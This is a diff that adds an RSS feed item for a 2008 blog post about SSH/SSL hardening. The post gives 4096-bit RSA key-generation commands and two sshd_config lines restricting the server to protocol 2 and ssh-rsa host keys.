+		<description><![CDATA[My OpenSSL-based daemons are back up ! These commands should provide quite a good security level for a while (at least again non super-power governmental organizations) : $ ssh-keygen -t rsa -b 4096 # openssl genrsa -aes256 -out secret.key 4096 I am the only person to use the server, so I don&#8217;t have any scallability...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/05/20/sshssl-patching-and-hardening.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>My OpenSSL-based daemons are back up !</p>
+<p>These commands should provide quite a good security level for a while (at least again non super-power governmental organizations) :</p>
+<pre>$ ssh-keygen -t rsa -b 4096
+# openssl genrsa -aes256 -out secret.key 4096</pre>
+<p>I am the only person to use the server, so I don&#8217;t have any scallability issue. :)</p>
+<p>Just to enforce the ssh configuration, I added these two line in sshd_config :</p>
+<pre>Protocol 2
+HostKeyAlgorithms ssh-rsa</pre>
+]]></content:encoded>
+			</item>
+	</channel>
+</rss>
